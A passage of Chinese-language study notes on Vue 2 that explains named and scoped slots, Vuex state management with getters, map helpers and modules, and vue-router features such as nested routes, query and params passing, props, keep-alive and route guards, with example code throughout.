      <h3>{{title}}分类</h3>
      <!-- 定义一个插槽，等着组件的使用者进行填充 -->
      <!-- 此处name中的center和footer为例子 -->
      <slot name="center">我是一个默认值当使用者没有传递具体结构时，我会出</slot>
    <slot name="footer">我是一个默认值当使用者没有传递具体结构时，我会出</slot>
</div>
```

> 此处的title为父组件传递过来的数据

在使用该插槽的组件中先引入该组件 `import xxx from .../xxx.vue` 并注册该组件

```vue
<xxx title="内容">
    <img slot="center" src="xxx.png" alt=""/>
    <a slot="footer" href="javascript:0">更多</a>
</xxx>
<!-- 该插槽里面如果不写结构则将展示默认的结；使用插槽时，在标签结构中指明该结构将放入哪一个插槽中，即写上插槽名 slot="xxx"，这样即可将该结构放入插槽名为xxx的插槽中-->
```

##### 作用域插槽

> 作用域插槽主要处理的问题是：处理同一份数据，但是需要不同的呈现方式的情景。也就是说此时的数据在定义插槽的那个组件中。

> 以上两种插槽在使用时，数据都是在使用者手中的，所以使用者可以在本组件中随意的使用数据，但是如果数据定义在插槽所在的组件中，那么就需要解决一个问题，那就是如何将数据从插槽所在组件传入到使用插槽的组件中；作用域插槽就很好的解决了这个问题。

那么作用域插槽是如何解决这个问题的呢？往下看

定义一个组件xxx.vue，定一个插槽

```vue
<div>
    <h3>{{ title }}分类</h3>
    <slot :games="games">默认的内容</slot>
</div>
```

> 注意：此时的数据games[...]在xxx.vue组件中

再使用插槽的组件中这样写即可：

```vue
<xxx title="游戏">
      <template scope="demo">
       <ul>
        <li v-for="(item, index) in demo.games" :key="index">{{ item }}</li>
      </ul>
      </template>
</xxx>
```

> 注意此处的demo传回来的是一个对象所以必须使用demo.games才能拿到games数组了

es6结构赋值可以简化操作

```vue
<xxx title="游戏">
      <template scope="{games}">
       <ul>
        <li v-for="(item, index) in games" :key="index">{{ item }}</li>
      </ul>
      </template>
</xxx>
```

> 此处的scope也可以使用slot-scope，没啥区别，只是新旧API的问题，
>
> 注意点：template、scope（不是scoped）
>
> **作用域插槽既可以和默认插槽配合使用也可以和具名插槽配合使用**

#### vuex的使用

vuex是什么：

专门在Vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信

GitHub地址：https://github.com/vuejs/vuex

什么时候用vuex呢？

1、多个组件依赖于同一状态

2、来自不同组件的行为需要变更同一状态

vuex工作原理图：

![vuex工作原理图](https://raw.githubusercontent.com/ZhangjunqiGithub/picture/master/vuex.jpg)

##### 基本使用步骤

> 注意事项：vue和vuex的版本对应关系。vue2---vuex3。vue3---vuex4。

**安装：**`npm i vuex` **安装指定版本：**`npm i vuex@版本号`

**1、**在main.js中引入vuex：`import Vuex from 'vuex'`

**2、**在main.js中注册vuex：`Vue.use(Vuex)`

**3、**在src/创建一个store文件夹，在store文件夹中创建一个index.js文件

> 以上几步结束后，Vue和Vue Component身上都会有$store了，这样就可以调用vuex中store身上的**dispatch、commit等方法了**

**4、**编写index.js中的代码

基础配置：

```js
//该文件用于创建Vuex中最为核心的store
//引入Vuex
import Vuex from 'vuex'
//准备actions——用于响应组件中的动作
const actions = {}
//准备mutations——用于操作数据(state)
const mutations = {}
//准备state——用于存储数据
const state = {}
//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state
})
```

实例代码（index.js）：

```js
//该文件用于创建Vuex中最为核心的Store

//引入Vue
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)
//准备actions——用于响应组件中的动作
const actions = {
        // jia(context, value) {
        //     context.commit('JIA', value)
        // },
        // jian(context, value) {
        //     context.commit('JIAN', value)
        // },
        jiaOdd(context, value) {
            if (context.state.sum % 2) {
                context.commit('JIA', value)
            }
        },
        jiaWait(context, value) {
            setTimeout(() => {
                context.commit('JIA', value)
            }, 500);
        }
    	//当逻辑过于复杂的时候我们需要入下做法(可以是逻辑更加清晰,避免一个函数中写了过于多的代码)
    /*
    test(context,value) {
    	处理了一部分逻辑
    	context.dispatch('do_next1',value);
    },
    do_next1(context,value) {
    	处理了一部分逻辑
    	context.dispatch('do_next2',value);
    },
    do_next2(context,value){
    	处理最后一部分逻辑
    	context.commit('DOTEST',value);
    }
    */
    
    }
    //准备mutations——用于操作数据（state）
const mutations = {
        JIA(state, value) {
            state.sum += value
        },
        JIAN(state, value) {
            state.sum -= value
        }
    }
    //准备state——用于存储数据
const state = {
        sum: 0, //当前的和
    }
    //准备getters——用于将state中的数据进行加工(逻辑复杂且需各组件复用时使用)
const getters = {
    bigSum(state) {
        return state.sum * 10;
    }
}

//创建store
export default new Vuex.Store({
    // actions: actions,
    // mutations: mutations,
    // state = state,
    actions,
    mutations,
    state,
    getters,
})
```

**5、**然后到main.js中引入store：`import store from './store/index.js'` 

也可以简写为：`import store from './store'` 当不指明store文件夹下的哪一个文件的时候，系统会默认该文件夹中去找index.js，如果没有index.js那么就不能这样简写。

**6、**在main.js  new Vue的时候将store当作参数传递进去。

```js
new Vue({
    el: '#app',
    render: h => h(App),
    store,
})
```

> 以上步骤结束后，所有的VueModel和VueComponents身上都会有$store了

> 经典错误：Uncaught Error: [vuex] must call Vue.use(Vuex) before creating a store instance.如果出现这样的错误那么说明你vuex的引用和use的位置出错了，我们需要将`import Vuex from 'vuex'` `Vue.use(Vuex)`写在index.js中，不能写在main.js中。

补充:帮助理解`this.$store.dispatch('add', value)`、actions对象中对应的`add(context, value)`和mutations对象中的`ADD(state, value)`。首先，我们要知道数据存储在state对象中。当我们调用了`this.$store.dispatch('add', value)`后，程序会去actions对象中去查找对应的add函数并将value值传入到add的value中；add中的context参数我们可以理解为是一个简化版的store,我门可以通过`context.state.数据`的方式访问到state对象中存储的数据且可以通过`context.commit('ADD', value)`的方式去执行mutations对象中对应的ADD函数，并将相应的value中传入到了ADD函数的参数value中了，在ADD函数中我们可以使用`state.数据`的方式使用state中的数据。

> 最后当我们想在模板中使用state中的数据的时候，我们可以这样做：{{$store.state.数据}}在函数中使用的时候：this.$store.state.数据

##### store.getters的使用

**使用场景：**当需要将store中的数据进行**相对复杂的处理**后**供多个组件使用**的时候我们就需要用到这个配置项。

**基本使用方法：**

跟actions、mutations、state配置项一样，我们需要在index.js中，先准备好一个getters对象，该对象中写法和计算属性有些相似，如下

```js
const getters = {
    fuzhachulihoudejieguo(state) {
        return state.sum * 10;
    }
}
```

注意：别忘了还要在Store对象中去配置，如下：

```js
export default new Vuex.Store({
    // actions: actions,
    // mutations: mutations,
    // state = state,
    actions,
    mutations,
    state,
    getters,
})
```

> 以上操作都是在index.js中完成的

那么我们又该如何在组件中去使用经过复杂处理后的结果呢？

`$store.getters.fuzhachulihoudejieguo`这样我们就可以拿到经过复杂处理后的结果了。

##### vuex中的mapState与mapGetters的使用

**使用场景：**当我们在使用state中的数据的时候，总是需要通过`$store.state.数据` 的方式来获取数据，但是我们想简化这个操作，想和在组件中访问data中的数据那样`{{数据}}`来获取数据。那么此时就需要用到mapState和mapGetters了。

**使用方法：**

假如state中的数据为：

```js
const state = {
    data1: 100,
    data2: 'string',
},
const getters = {
    fuzhachulihoudejieguo(state) {
        return state.sum * 10;
    }
}
```

**1、**现在对应的**组件中**引入： `import {mapState,mapGetters} from 'vuex'`

> 如果我们按照常规的方法去做，我们需要在相应的组件中写上计算属性，如下：

```vue
computed: {
	data1() {
		return this.$store.state.data1
	},
	data2() {
		return this.$store.state.data2
	},
	fuzhachulihoudejieguo() {
		return this.$store.getters.fuzhachulihoudejieguo
	}
}
```

> 显然这样写代码就显得有点冗余

**2、**利用mapState和mapGetters来简化操作

**对象形式：**

...mapState({data1: 'data1', data2: 'data2'}),

...mapGetters({fuzhachulihoudejieguo: 'fuzhachulihoudejieguo'})

**简写形式：**

...mapState(['data1','data2'])

...mapGetters(['fuzhachulihoudejieguo'])

##### vuex中的mapMutations与mapActions的使用

**mapMutations的作用：**可以帮助我们简化this.$commit("函数名"， 参数)；

**mapActions的作用：**可以帮助我们简化this.$store.dispatch("函数名"，参数)

**使用方法：**

```vue
 /*increment() {
      this.$store.commit("JIA", this.n);
    },
    decrement() {
      this.$store.commit("JIAN", this.n);
    },*/
  //借助mapMutations生成对应的方法，方法中会调用commit去联系mutations（对象写法）
  ...mapMutations({increment:'JIA',decrement:'JIAN'}),

  //借助mapMutations生成对应的方法，方法中会调用commit去联系mutations（数组写法）
  // ...mapMutations(['JIA','JIAN']),此时button中绑定的事件就应该为引号中的内容

    // incrementOdd() {
    //   this.$store.dispatch("jiaOdd", this.n);
    // },
    // incrementWait() {
    //   this.$store.dispatch("jiaWait", this.n);
    // },

  //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions（对象写法）
    ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})

  //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions（数组写法）
    // ...mapActions(['jiaOdd','jiaWait'])
```

> 注意使用时如何传参

```vue
<button @click="increment(n)">+</button>
<button @click="decrement(n)">-</button>
<button @click="incrementOdd(n)">当前求和为奇数再加</button>
<button @click="incrementWait(n)">等一等再加</button>
```

##### vuex模块化编码 

**使用场景：**当处理的数据对象不是同一类，而且需要分开来处理的时候，我们就可以将其分别写在不同js文件中，然后将所有的js文件整合到index.js文件中。

例如：

**count.js**

```js
// 求和相关的配置
export default {
    namespaced: true,
    actions: {
        jiaOdd(context, value) {
            if (context.state.sum % 2) {
                context.commit('JIA', value)
            }
        },
        jiaWait(context, value) {
            setTimeout(() => {
                context.commit('JIA', value)
            }, 500);
        }
    },
    mutations: {
        JIA(state, value) {
            state.sum += value
        },
        JIAN(state, value) {
            state.sum -= value
        },
    },
    state: {
        sum: 0, //当前的和
        school: 'xxx大学',
        subject: '前端',
    },
    getters: {
        bigSum(state) {
            return state.sum * 10;
        }
    }
}
```

**person.js**

```js
// 人员管理相关的配置
import axios from 'axios'
import { nanoid } from 'nanoid'
export default {
    namespaced: true,
    actions: {
        addPersonWang(context, value) {
            if (value.name.indexOf('王') === 0) {
                context.commit('ADD_PERSON', value)
            } else {
                alert('添加的人必须姓王')
            }
        },
        addPersonServer(context) {
            axios.get('http://127.0.0.1:5000/api/name').then(
                res => {
                    context.commit('ADD_PERSON', { id: nanoid(), name: res.data.data.name })
                },
                error => {
                    alert(error.message)
                }
            )
        }
    },
    mutations: {
        ADD_PERSON(state, value) {
            state.personList.unshift(value)
        }
    },
    state: {
        personList: [
            { id: '001', name: '张三' }
        ]
    },
    getters: {
        firstPersonName(state) {
            return state.personList[0].name
        }
    }
}
```

**index.js**

```js
//该文件用于创建Vuex中最为核心的Store

//引入Vue
import Vue from 'vue'
//引入Vuex
import Vuex from 'vuex'
import countOptinos from './count'
import personOptions from './person'
//应用Vuex插件
Vue.use(Vuex)

//创建store
export default new Vuex.Store({
    modules: {
        countAbout: countOptinos,
        personAbout: personOptions,
    }
})
```

在Count.vue中使用存在Vuex中数据的方法如下：

```vue
<template>
  <div>
    <h1>当前求和为：{{ sum }}</h1>
    <h3>当前求和放大10倍后为：{{ bigSum }}</h3>
    <h3>学校：{{ school }},课程：{{ subject }}</h3>
    <h3 style="color: red">
      Person组件的总人数是：{{personList.length }}
    </h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import {mapGetters, mapState, mapMutations, mapActions} from 'vuex'
export default {
  name: "Count",
  data() {
    return {
      n: 1, //用户选择的数字
    };
  },
  methods: {
  //借助mapMutations生成对应的方法，方法中会调用commit去联系mutations（对象写法）
  ...mapMutations('countAbout',{increment:'JIA',decrement:'JIAN'}),

  //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions（对象写法）
    ...mapActions('countAbout',{incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
  },
  computed: {
    // 借助mapState生成计算属性，从state中读取数据。（数组写法）
    ...mapState('countAbout',['sum','school','subject']),
    ...mapState('personAbout',['personList']),
    // 借助mapGetters生成计算属性，从state中读取数据。（数组写法）
    ...mapGetters('countAbout',['bigSum'])
  },
};
</script>

<style>
button {
  margin-left: 5px;
}
</style>
```

> 注意点：`namespaced true`,count.js和person.js需要暴露出去

#### Vue路由的使用

解释：一个路由就是一组映射关系（key-value）；key为路径，value可能是function(后端)或component(前端)

一般的我们会把**一般组件**放到src/components文件夹中，**路由组件**放到src/pages文件夹中

> 注意：
>
> Vue2————vue-router@3（3版本）
>
> Vue3————vue-router@4（4版本）
>
> 以Vue2为例：
>
> 1、首先安装插件 npm i vue-router@3
>
> 2、在main.js中先引入VueRouter`import VueRouter from 'vue-router'`
>
> 3、再应用插件`Vue.use(VueRouter)`
>
> 4、在src/创建一个文件夹router，在router文件夹下创建一个index.js，该文件专门用于创建整个应用的路由器，该文件中要引入组件，并创建路由器

**index.js:**

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
//创建一个路由器
export default new VueRouter({
    routes: [{
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home
        }
    ]
})
```

> 5、引入路由器 `import  router from './router/index'`
>
> 6、在new Vue的时候传入，代码如下：

```vue
new Vue({
    el: '#app',
    render: h => h(App),
    router,
})
```

**App.vue:**

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
          <!-- active-class="active"实现导航高亮随鼠标点击而切换 -->
          <!-- Vue中通过router-link标签实现路由的切换 -->
          <router-link to="/about" class="list-group-item" active-class="active">About</router-link>
          <router-link to="/home" class="list-group-item" active-class="active">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
            <!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import Banner from './components/Banner'
export default {
  name: "App",
  components: {Banner}
};
</script>
```

`<router-view></router-view>`：组件呈现的位置

> 几个注意点：
>
> 1、路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹
>
> 2、通过切换，**隐藏**了的路由组件，默认是**被销毁掉**的，需要的时候再去挂载，这样如果在一个组件中输入了数据，当我们跳转到另一个组件然后再回到这个组件的时候，我们之前输入的数据就没了，因为之前的组件已经销毁，现在是重新加载的。
>
> 3、每个组件都有自己的$router属性，里面存储着自己的路由信息
>
> 4、整个应用只有一个router,可以通过组件的$router属性获取到

##### 嵌套路由

(父路由组件)**Home.vue:**

```vue
<template>
  <div>
      <h2>我是Home的内容</h2>
      <div>
        <ul class="nav nav-tabs">
          <li>
            <!-- 此处要加上父组件的路径/home -->
            <router-link to="/home/news" class="list-group-item" active-class="active">News</router-link>
          </li>
          <li>
            <router-link to="/home/message" class="list-group-item" active-class="active">Message</router-link>
          </li>
        </ul>
        <router-view></router-view>
      </div>
  </div>
</template>

<script>
export default {
    name: 'Home',
}
</script>
```

（子路由组件）**Message.vue:**

```vue
<template>
  <div>
      <ul>
          <li><a href="/message1">message001</a>&nbsp;&nbsp;</li>
          <li><a href="/message2">message002</a>&nbsp;&nbsp;</li>
          <li><a href="/message3">message003</a>&nbsp;&nbsp;</li>
      </ul>
  </div>
</template>

<script>
export default {
    name: 'Message'
}
</script>
```

（子路由组件）**News.vue:**

```vue
<template>
  <div>
    <ul>
      <li>news001</li>
      <li>news002</li>
      <li>news003</li>
    </ul>
  </div>
</template>

<script>
export default {
  name: "News",
};
</script>
```

**路由器src/router/index.js:**

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
//创建一个路由器
export default new VueRouter({
    routes: [{
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [{
                    // 注意：此处path不加/
                    path: 'news',
                    component: News,
                },
                {
                    path: 'message',
                    component: Message,
                }
            ]
        }
    ]
})
```

> 几个注意点：
>
> 1、子路由路径不能加 /
>
> 2、在父路由中用子路由时，router-link中to的路径要写带有父路径的路径

##### 路由传参(query参数)

**此处继续用上面的例子**

说明情景：Message.vue组件将展示多个消息，我们想查看消息的详情，考虑到代码的复用性，我们不可能每一条消息都对应的写一个Detail详情组件，此时我们只写一个Detail详情组件，通过路由传参的方式来实现点击不同的消息展现不同的消息详情。下面我们来看实现此功能的部分代码：主要观察Message.vue和Detail.vue

> 重点是Message.vue中的传参方式和Detail.vue中的获取参数的方式

**index.js中写好路由规则：**

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'
//创建一个路由器
export default new VueRouter({
    routes: [{
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [{
                    // 注意：此处path不加/
                    path: 'news',
                    component: News,
                },
                {
                    path: 'message',
                    component: Message,
                    children: [{
                        path: 'detail',
                        component: Detail,
                    }]
                }
            ]
        }
    ]
})
```

**Message.vue:**

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->
        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
          path:'/home/message/detail',
          query: {
            id: m.id,
            title: m.title
          }
        }">
          {{m.title}}
          </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

**Detail.vue:**

```vue
<template>
  <ul>
      <li>消息编号{{$route.query.id}}</li>
      <li>消息编号{{$route.query.title}}</li>
  </ul>
</template>

<script>
export default {
    name:'detail',
    
}
</script>

<style>

</style>
```

##### 命名路由

**作用：**简化路由跳转时所写的路径

**使用方法：**

1、在配置路由规则router/index.js时给指定的路由配置好name属性

> 重点关注以下代码中的name属性配置

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'
//创建一个路由器
export default new VueRouter({
    routes: [{
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [{
                    // 注意：此处path不加/
                    path: 'news',
                    component: News,
                },
                {
                    path: 'message',
                    component: Message,
                    children: [{
                        name: 'xiangqing',
                        path: 'detail',
                        component: Detail,
                    }]
                }
            ]
        }
    ]
})
```

> 当我们给指定的路由配置好了name属性后，在使用router-link :to去指定跳转的路由时，就可以通过name来指定了，就不需要写很长的路径了。**但是这样做有一个缺点，那就是我们只能用to的对象写法。**

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带query参数，to的字符串写法 -->
        <!-- <router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp; -->
        <!-- 跳转路由并携带query参数，to的对象写法 -->
        <router-link :to="{
          name:'xiangqing',
          query: {
            id: m.id,
            title: m.title
          }
        }">
          {{m.title}}
          </router-link>&nbsp;&nbsp;
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

##### 路由传参(params参数)

此处我们依然用上面的例子

> 首先我们要处理的是找到router/index.js在配置路径的时候写上参数占位符,如下的`:id`和`:title`

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'
//创建一个路由器
export default new VueRouter({
    routes: [{
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [{
                    // 注意：此处path不加/
                    path: 'news',
                    component: News,
                },
                {
                    path: 'message',
                    component: Message,
                    children: [{
                        name: 'xiangqing',
                        path: 'detail/:id/:title',
                        component: Detail,
                    }]
                }
            ]
        }
    ]
})
```

> 注意params传参必须指明name,如上面的name:'xiangqing'

接下来我们需要知道在router-link :to中如何使用：

> 主要看下面的params的字符串和对象的两种写法，需要注意的是在使用**对象**的方式传参时，一定要指明name,并且此时只能用name配置来指明路径,不能用path来知名路径

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带params参数，to的字符串写法 -->
        <router-link :to="`/home/message/detail/${m.id}/${m.title}`">{{m.title}}</router-link>&nbsp;&nbsp;
        <!-- 跳转路由并携带params参数，to的对象写法 -->
        <!-- <router-link :to="{
          name:'xiangqing',//params参数传参只能用name,不能用Paths
          params: {
            id: m.id,
            title: m.title
          }
        }">
          {{m.title}}
          </router-link>&nbsp;&nbsp; -->
      </li>
    </ul>
    <hr>
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>
```

##### 路由的props配置

**作用：**当我们在使用query或params传参时，获取参数时需要使用`$router.query.参数`或`$router.params.参数`这样就先的模板字符串有点过于复杂，为了简化这个操作，我们可以使用props配置。

**基本使用：**

在index.js中相应需要接收数据的组件（Detail）中写上props配置,一共有如下三种写法：

```js 
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'
//创建一个路由器
export default new VueRouter({
    routes: [{
            name: 'guanyu',
            path: '/about',
            component: About
        },
        {
            path: '/home',
            component: Home,
            children: [{
                    // 注意：此处path不加/
                    path: 'news',
                    component: News,
                },
                {
                    path: 'message',
                    component: Message,
                    children: [{
                        name: 'xiangqing',
                        path: 'detail',
                        component: Detail,
                        // props的第一种写法，值为对象,该对象中的所有key-value都会以props的形式传给Detail组件
                        // props: {
                        //     a: 1,
                        //     b: 'hello'
                        // }

                        // props的第二种写法，值为布尔值,若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件
                        // props: true

                        // props的第三种写法，值为函数
                        props($route) {
                            return {
                                id: $route.query.id,
                                title: $route.query.title
                            }
                        }
                    }]
                }
            ]
        }
    ]
})
```

> 注意：props的第二种写法值为布尔值，若为真，就会把该路由组件收到的所有**params**参数，以props的形式传给Detail组件；注意只能用于params参数。

然后在相应的(Detail)组件中配置好props接收数据即可。

```vue
<template>
  <ul>
      <li>消息编号{{id}}</li>
      <li>消息编号{{title}}</li>
  </ul>
</template>

<script>
export default {
    name:'detail',
    props:['id', 'title'],
}
</script>

<style>

</style>
```

> 注意这里的名字要对应，当在Detail中接收之后，就可以直接用id来代替$router.query.id了

##### router-link的replace属性+编程式路由导航

> 浏览器的历史记录写入有两种模式分别为：push模式和replace模式：
>
> push模式，浏览器会把每次的浏览的网址记录下来，存入到一个栈中，例如，这样就可以通过点击返回键回到上一个网页。replace模式当我们从一个网页跳到另一个网页的时候，新网页的地址会覆盖掉上一个网页的地址，这种情况就不能通过点击返回键返回到上一个网页了。

使用方法例如：`<router-link replace to="/about">About</router-link>`

**编程式路由导航：**

我们可以利用`this.$router.push({})` 和 `this.$router.replace({})`来指定跳转

```vue
this.$router.push({
	name: 'xiangqing',
	query: {
		id: m.id,
		title: m.title
	}
})

this.$router.replace({
	name: 'xiangqing',
	query: {
		id: m.id,
		title: m.title
	}
})
```

> 如果利用的是push进行跳转，那么浏览器会将每一个网页的地址都记录到一个栈中，我们可以通过点击返回键返回到之前访问过的网页。如果利用的是replace进行跳转，那么浏览器在条状到新网页的时候会覆盖掉旧网页的地址，但是这样我们是无法通过点击返回键跳转到之前访问过的网页。

`this.$router.back()`和`this.$router.forward()`可以用来实现浏览器左上角的`<` 和 `>`的用途。

`this.$router.go(2)` 前进两次，`this.$router.go(-2)` 后退两次

##### 缓存路由组件

我们知道当通过路由来实现各组件间的切换的时候，当切换到另一个组件后，前一个组件中所填写的数据就会被没有了，这是因为当我们切换到另一个组件后，前一个组件将会被销毁，当我们再次返回此组件时，又会重新构建出该组件，所以之前所输入的内容就没有了。

但是有时候我们想保留这些数据，那么我就需要用到缓存路由组件`<keep-alive></keep-alive>`

```vue
<!-- 缓存一个路由组件 -->
<keep-alive include="News">
    <router-view></router-view>
</keep-alive>
<!-- 缓存多个路由组件 -->
<!-- 此处News和Message都为组件 -->
<keep-alive :include="['News', 'Message']">
    <router-view></router-view>
</keep-alive>
```

> 注意keep-alive要包裹着**展示区<router-view></router-view>**，且注意当缓存多个路由组件时，include前要加  :

##### 两个新的生命周期钩子activated+deactivated（路由组件独有）

**使用场景：**

如果一个组件被缓存，当我们在这个组件中写了定时器，那么当我们跳转到另一个新组件的时候，由于原组件被缓存，所以原组件中的定时器还是会一直执行。为了解决这类问题，我们就需要用到这两个生命周期钩子了。

**作用：**路由组件所独有的两个钩子，用于捕获路由组件的激活状态

| activated   | 路由组件被激活时触发（当组件展示到页面的时候） |
| ----------- | ---------------------------------------------- |
| deactivated | 路由组件失活时触发（当组件跳转后）             |

那么我们是如何解决上面所描述的问题的呢？

我们可以将这些会一直执行的函数放到activated(){...}函数中，将控制停止执行该函数的代码写在deactivated(){...}函数中，对于定时器就是clearInterval(this.timer)。

##### 全局路由守卫

> 控制路由的权限，在满足一定条件下才能访问某个路由组件

**使用方法：**

1、找到路由器配置文件index.js

2、如果要使用路由守卫，那么此时就不能再用export default进行默认暴露了，我们需要先将new VueRouter({})用一个变量接收到如：`const router = new VueRouter({}) `,**且切记，在文件的最后方要对外暴露出router**  `export default export`

3、在与new VueRouter({})同级的位置写如下代码

```js
//全局前置路由守卫——每一次路由切换之前被调用
router.beforeEach((to, from, next) => {
    //处理函数
    next();//放行函数
})

// 全局后置路由守卫——初始化的时候被调用，每次路由切换之后被调用
router.afterEach((to, from) => {
    document.title = to.meta.title || 'Welcome'
})
```

**实例：**

```js
// 全局前置路由守卫——初始化的时候被调用，每次路由切换之前被调用
router.beforeEach((to, from, next) => {
    if (to.meta.isAuth) { //判断是否需要鉴别权限
        if (判断条件) {
            next();
        } else {
            alert('学校名不对，无权限查看！')
        }
    } else {
        next()
    }
})

// 全局后置路由守卫——初始化的时候被调用，每次路由切换之后被调用
router.afterEach((to, from) => {
    document.title = to.meta.title || 'Welcome'
})

export default router
```

当我们想指定控制哪个路由需要限制的时候，用普通的方法可能需要通过to.name来查看该路由组件所要前往的路由组件是否是xxx需要校验的路由组件。但是我们会通过在路由器配置index.js中对应的路由位置，写上meta:{},该对象是专门给程序员自己写一些自定义的配置属性的，那么我们就可以在该对象里面写上一个isAuth用来判断是否需要权限校验。

```js
    {
                    name: 'xiaoxi',
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '新闻' },
                    children: [{
                        name: 'xiangqing',
                        path: 'detail',
                        component: Detail,
                        meta: { isAuth: true, title: '详情' 						},
                        // props的第一种写法，值为对象,该对象中的所有key-value都会以props的形式传给Detail组件
                        // props: {
                        //     a: 1,
                        //     b: 'hello'
                        // }

                        // props的第二种写法，值为布尔值,若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件
                        // props: true

                        // props的第三种写法，值为函数
                        props($route) {
                            return {
                                id: $route.query.id,
                                title: $route.query.title
                            }
                        }
                    }]
    }
```

> 当发生路由跳转的时候，会依次调用beforeEach和afterEach两个函数，也就相当于**进入新路由组件前和进入新路由组件后**，这个要和组件内路由守卫区别开来，组件内路由守卫也有两个函数，分别为beforeRouterEnter和beforeRouterLeave，这两个函数的调用时机和上两个不一样，beforeRouterEnter和全局路由守卫beforeEach是一样的，但是当进入新路由组件之后，并不会调用beforeRouterLeave,这个函数是当我们从这个新路由跳转到另一个新路由的时候调用。

##### 独享路由守卫

> 单独控制某个组件的路由守卫，写在路由器配置文件index.js中相应的路由组件配置的地方，注意：只有beforeEnter: (to, from, next) => {}前置路由守卫，没有后置路由守卫。如果有需要后置路由守卫完成的工作，那么可以通过全局后置路由守卫来解决。

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'
//创建一个路由器
const router = new VueRouter({
    routes: [{
            name: 'guanyu',
            path: '/about',
            component: About,
            meta: { title: '关于' }
        },
        {
            name: 'zhuye',
            path: '/home',
            component: Home,
            meta: { title: '主页' },
            children: [{
                    // 注意：此处path不加/
                    name: 'xinwen',
                    path: 'news',
                    component: News,
                    meta: { isAuth: true, title: '新闻' },
                    beforeEnter: (to, from, next) => {
                        if (to.meta.isAuth) { //判断是否需要鉴别权限
                            if (判断条件) {
                                next();
                            } else {
                                alert('条件不符，无权限查看！')
                            }
                        } else {
                            next()
                        }
                    }
                },
                {
                    name: 'xiaoxi',
                    path: 'message',
                    component: Message,
                    meta: { isAuth: true, title: '消息' },
                    children: [{
                        name: 'xiangqing',
                        path: 'detail',
                        component: Detail,
                        meta: { isAuth: true, title: '详情' },
                        // props的第一种写法，值为对象,该对象中的所有key-value都会以props的形式传给Detail组件
                        // props: {
                        //     a: 1,
